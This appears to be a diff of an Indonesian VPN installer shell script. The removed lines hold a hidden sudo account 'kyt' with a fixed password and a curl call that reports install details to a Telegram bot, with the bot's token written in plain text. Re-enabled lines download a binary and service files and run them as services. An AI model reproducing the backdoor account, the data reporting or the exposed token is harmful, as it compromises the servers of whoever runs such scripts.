@@ -332,18 +332,18 @@ function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     #userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
+    #Username="kyt"
+    #Password=kyt
+    #mkdir -p /home/script/
+    #useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+   #echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    #usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="5655546616"
-    KEY="6445872331:AAGkapsWAP5RsbxAWEK9rVcFv4weZQreKU4"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script Stable V3.0
+    #CHATID="5655546616"
+    #KEY="6445872331:AAGkapsWAP5RsbxAWEK9rVcFv4weZQreKU4"
+    #TIME="10"
+    #URL="https://api.telegram.org/bot$KEY/sendMessage"
+    #TEXT="Installasi VPN Script Stable V3.0
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
@@ -365,7 +365,7 @@ function password_default() {
     ============================
 "
 
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+   #curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 
 clear
@@ -560,24 +560,24 @@ function udp_mini(){
 clear
 print_install "Memasang UDP MINI"
 # // Installing UDP Mini
-#mkdir -p /usr/local/kyt/
-#wget -q -O /usr/local/kyt/udp-mini "${REPO}badvpn/udp-mini"
-#chmod +x /usr/local/kyt/udp-mini
-#wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}badvpn/udp-mini-1.service"
-#wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}badvpn/udp-mini-2.service"
-#wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}badvpn/udp-mini-3.service"
-#systemctl disable udp-mini-1
-#systemctl stop udp-mini-1
-#systemctl enable udp-mini-1
-#systemctl start udp-mini-1
-#systemctl disable udp-mini-2
-#systemctl stop udp-mini-2
-#systemctl enable udp-mini-2
-#systemctl start udp-mini-2
-#systemctl disable udp-mini-3
-#systemctl stop udp-mini-3
-#systemctl enable udp-mini-3
-#systemctl start udp-mini-3
+mkdir -p /usr/local/kyt/
+wget -q -O /usr/local/kyt/udp-mini "${REPO}badvpn/udp-mini"
+chmod +x /usr/local/kyt/udp-mini
+wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}badvpn/udp-mini-1.service"
+wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}badvpn/udp-mini-2.service"
+wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}badvpn/udp-mini-3.service"
+systemctl disable udp-mini-1
+systemctl stop udp-mini-1
+systemctl enable udp-mini-1
+systemctl start udp-mini-1
+systemctl disable udp-mini-2
+systemctl stop udp-mini-2
+systemctl enable udp-mini-2
+systemctl start udp-mini-2
+systemctl disable udp-mini-3
+systemctl stop udp-mini-3
+systemctl enable udp-mini-3
+systemctl start udp-mini-3
 print_success "UDP MINI"
 }
 
